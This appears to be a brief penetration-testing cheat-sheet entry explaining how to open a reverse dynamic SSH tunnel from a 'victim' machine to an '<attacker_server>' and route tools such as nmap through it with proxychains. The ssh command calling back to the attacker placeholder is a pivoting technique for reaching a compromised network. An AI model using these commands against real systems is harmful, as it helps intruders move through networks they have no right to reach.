# Reverse dynamic ssh tunnels

**Description:** This entry describes how to setup a reverse dynamic ssh tunnel from a victim machine

**Requirements:** ssh, proxychains

## Host (Victim) machine

```
ssh -R 2222 <user>@<attacker_server>
```

Run this command from the host machine to create a reverse dyanmic tunnel.

## Attacker server

```
apt install proxychains
```

Install proxychains

```
vim /etc/proxychains.conf

# Edit this line
socks4 127.0.0.1 2222
```

Open and update the proxychains configuration to the port specified in your previous command e.g. 2222

```
proxychains <supported_tool>
```

Run proxychains with supported tools such as nmap and the traffic will go through the host (victim machine)
  
## References
* https://www.openssh.com/txt/release-7.6